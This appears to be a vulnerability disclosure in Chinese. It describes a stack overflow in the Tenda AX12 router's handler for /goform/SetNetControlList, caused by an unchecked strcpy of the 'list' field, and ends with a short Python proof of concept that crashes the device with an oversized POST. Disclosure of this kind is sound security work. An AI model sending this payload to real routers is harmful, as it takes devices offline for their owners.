# 漏洞描述

设备：Tenda-AX12 V22.03.01.21_CN(https://www.tenda.com.cn/download/detail-3237.html)

漏洞类型：栈溢出

攻击效果：拒绝服务

# 漏洞成因

该漏洞为发生在`sub_4327CC`函数中的栈溢出漏洞，该函数处理`/goform/SetNetControlList`下的post请求

v2来自于http数据包中的list变量，随后调用了`sub_4325BC`函数

![image-20220209162823940](image/1.png)

在`sub_4325BC`函数中，调用了strcpy函数来对list进行拷贝，缺少安全检测从而导致栈溢出

![image-20220209162909094](image/2.png)

攻击者可借此实现拒绝服务攻击

# POC

拒绝服务的Poc：

```python
import requests

url = "http://192.168.0.1/goform/SetNetControlList"
list_data = 'a'*0x1000 + '\n'

r = requests.post(url, data={'list': list_data})
print(r.content)
```

